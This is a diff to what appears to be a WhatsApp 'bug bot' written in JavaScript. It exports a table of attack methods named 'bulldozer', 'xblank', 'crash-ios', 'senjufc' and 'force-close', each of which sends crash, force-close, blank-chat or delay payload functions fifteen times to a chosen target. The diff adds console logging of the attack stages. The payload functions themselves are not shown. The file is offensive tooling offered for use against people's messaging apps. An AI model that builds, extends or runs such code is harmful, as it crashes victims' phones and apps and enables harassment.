@@ -1040,72 +1040,93 @@ async function FcOneMsg(sock, target) {
 export const bugMethods = {
     "onemsg": (sock, target) => FcOneMsg(sock, target),
     "bulldozer": async (sock, target) => {
+        console.log(chalk.cyan.bold(`[Bulldozer] Starting Hard Delay on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
             await delayMakerInvisible(sock, target);
             await DelayNative(sock, target);
             await Jtwdlyinvis(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[Bulldozer] Hard Delay completed.`));
     },
     "invisible": async (sock, target) => {
+        console.log(chalk.cyan.bold(`[Invisible] Starting Hard Delay on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
             await delayMakerInvisible(sock, target);
             await DelayNative(sock, target);
             await Jtwdlyinvis(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[Invisible] Hard Delay completed.`));
     },
     "senjudelay": async (sock, target) => {
+        console.log(chalk.cyan.bold(`[SenjuDelay] Starting Hard Delay on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await callinvisible(sock, target);
             await DelayInvisibleXx(sock, target);
             await delayMakerInvisible(sock, target);
             await DelayNative(sock, target);
             await Jtwdlyinvis(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[SenjuDelay] Hard Delay completed.`));
     },
     "xblank": async (sock, target) => {
+        console.log(chalk.magenta.bold(`[XBlank] Starting Blank Attack on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await crashnew(sock, target);
             await BlackBlankTotal(sock, target);
             await XProtexBlankChatV3(sock, target);
             await JtwStuck(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[XBlank] Blank Attack completed.`));
     },
     "crash-ios": async (sock, target) => {
+        console.log(chalk.magenta.bold(`[Crash-iOS] Starting Blank Attack on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await crashnew(sock, target);
             await BlackBlankTotal(sock, target);
             await XProtexBlankChatV3(sock, target);
             await JtwStuck(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[Crash-iOS] Blank Attack completed.`));
     },
     "senjufc": async (sock, target) => {
+        console.log(chalk.red.bold(`[SenjuFC] Starting Force Close Attack on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await NexusChatAiCrash(sock, target);
             await EmpireUltimate(sock, target);
             await SkyForce(sock, target);
             await DocuMorsh01(sock, target);
             await JtwForcloseX(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[SenjuFC] Force Close Attack completed.`));
     },
     "force-close": async (sock, target) => {
+        console.log(chalk.red.bold(`[Force-Close] Starting Force Close Attack on ${target}...`));
         for (let i = 0; i < 15; i++) {
             await NexusChatAiCrash(sock, target);
             await EmpireUltimate(sock, target);
             await SkyForce(sock, target);
             await DocuMorsh01(sock, target);
             await JtwForcloseX(sock, target);
+            console.log(chalk.green(`  - Stage ${i + 1}/15 sent`));
             await sleep(1000);
         }
+        console.log(chalk.blue.bold(`[Force-Close] Force Close Attack completed.`));
     },
     "callinvisible": (sock, target) => callinvisible(sock, target),
     "crashnew": (sock, target) => crashnew(sock, target),
